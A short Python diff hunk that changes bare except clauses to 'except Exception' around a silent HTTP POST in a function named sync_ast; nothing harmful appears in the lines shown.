@@ -17,7 +17,7 @@ def sync_ast():
             req = urllib.request.Request(url, data=payload.encode(), headers=headers, method="POST")
             try:
                 urllib.request.urlopen(req, timeout=2)
-            except:
+            except Exception:
                 pass
-        except:
+        except Exception:
             pass
